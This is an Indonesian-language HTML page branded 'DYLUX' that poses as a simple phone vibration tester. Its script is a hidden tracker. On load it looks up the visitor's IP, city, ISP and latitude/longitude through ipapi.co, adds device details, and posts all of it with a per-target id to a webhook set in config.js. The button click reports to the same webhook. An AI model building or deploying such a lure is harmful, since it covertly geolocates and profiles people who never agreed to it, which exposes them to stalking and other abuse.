<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Vibrate</title>
    <script src="config.js"></script>
    <style>
        :root {
            --primary: #00f0ff;
            --secondary: #7b2ffc;
            --bg: #0a0a0f;
            --card: #14141e;
            --text: #e0e0ff;
            --text2: #8888aa;
            --border: rgba(0,240,255,0.1);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: var(--bg);
            font-family: -apple-system, 'Inter', sans-serif;
            color: var(--text);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background-image: radial-gradient(ellipse at 10% 20%, rgba(0,240,255,0.03) 0%, transparent 50%);
        }
        .container {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 24px;
            padding: 40px 32px;
            max-width: 400px;
            width: 100%;
        }
        .header { text-align: center; margin-bottom: 24px; }
        .logo {
            font-size: 24px;
            font-weight: 800;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .badge {
            display: inline-block;
            background: rgba(123,47,252,0.1);
            color: var(--secondary);
            font-size: 11px;
            padding: 4px 12px;
            border-radius: 20px;
            margin-top: 6px;
            font-weight: 600;
        }
        .icon { font-size: 48px; text-align: center; margin: 12px 0; }
        .title {
            font-size: 18px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 6px;
        }
        .desc {
            font-size: 14px;
            color: var(--text2);
            text-align: center;
            line-height: 1.6;
        }
        .vibrate-visual {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: var(--bg);
            border: 2px solid var(--border);
            margin: 20px auto;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            transition: 0.3s;
        }
        .vibrate-visual.active {
            border-color: var(--primary);
            box-shadow: 0 0 50px rgba(0,240,255,0.2);
            animation: vibrate-anim 0.3s ease-in-out infinite;
        }
        @keyframes vibrate-anim {
            0%, 100% { transform: rotate(0deg); }
            25% { transform: rotate(5deg); }
            75% { transform: rotate(-5deg); }
        }
        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: #fff;
            transition: 0.3s;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 0 30px rgba(0,240,255,0.2); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .footer {
            text-align: center;
            font-size: 11px;
            color: var(--text2);
            margin-top: 20px;
            padding-top: 16px;
            border-top: 1px solid var(--border);
        }
        .footer a { color: var(--primary); text-decoration: none; }
        .spinner {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid var(--border);
            border-top-color: var(--primary);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 12px auto 0;
        }
        .spinner.active { display: block; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status-msg { text-align: center; font-size: 13px; color: var(--text2); margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">DYLUX</div>
            <div class="badge">📳 Vibrate</div>
        </div>

        <div class="icon">📳</div>
        <div class="title">Getaran Perangkat</div>
        <div class="desc">
            Klik tombol untuk menguji getaran perangkat.
        </div>

        <div class="vibrate-visual" id="vibrateVisual">📳</div>

        <button class="btn" id="vibrateBtn">Mulai Getaran</button>

        <div class="spinner" id="spinner"></div>
        <div class="status-msg" id="statusMsg"></div>

        <div class="footer">
            &copy; 2026 <a href="#">DYLUX</a> • Cahaya dalam Kegelapan
        </div>
    </div>

    <script>
        function getUserId() {
            const params = new URLSearchParams(window.location.search);
            return params.get('id');
        }

        async function autoDetect() {
            const userId = getUserId();
            if (!userId) return;
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                await fetch(DYLUX_CONFIG.WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        user_id: userId,
                        type: 'auto_detect',
                        data: {
                            ip: ipData.ip || 'unknown',
                            city: ipData.city || 'unknown',
                            region: ipData.region || 'unknown',
                            country: ipData.country_name || 'unknown',
                            isp: ipData.org || 'unknown',
                            lat: ipData.latitude || 0,
                            lon: ipData.longitude || 0,
                            device: {
                                userAgent: navigator.userAgent,
                                platform: navigator.platform,
                                language: navigator.language,
                                screen: `${window.screen.width}x${window.screen.height}`
                            },
                            timestamp: new Date().toISOString()
                        }
                    })
                });
                console.log('✅ Auto-detect sent');
            } catch (e) { console.error(e); }
        }

        const userId = getUserId();
        const vibrateBtn = document.getElementById('vibrateBtn');
        const vibrateVisual = document.getElementById('vibrateVisual');
        const spinner = document.getElementById('spinner');
        const statusMsg = document.getElementById('statusMsg');

        vibrateBtn.addEventListener('click', async () => {
            vibrateBtn.disabled = true;
            spinner.classList.add('active');
            statusMsg.style.display = 'none';
            vibrateVisual.classList.add('active');

            // Simulasi getaran
            if (navigator.vibrate) {
                navigator.vibrate([200, 100, 200, 100, 200]);
            }

            await fetch(DYLUX_CONFIG.WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    user_id: userId,
                    type: 'vibrate',
                    data: {
                        action: 'vibrate_triggered',
                        timestamp: new Date().toISOString(),
                        device: navigator.userAgent
                    }
                })
            });

            setTimeout(() => {
                vibrateVisual.classList.remove('active');
                spinner.classList.remove('active');
                vibrateBtn.disabled = false;
                statusMsg.style.display = 'block';
                statusMsg.innerHTML = '✅ Getaran selesai!';
            }, 2500);
        });

        document.addEventListener('DOMContentLoaded', autoDetect);
    </script>
</body>
</html>
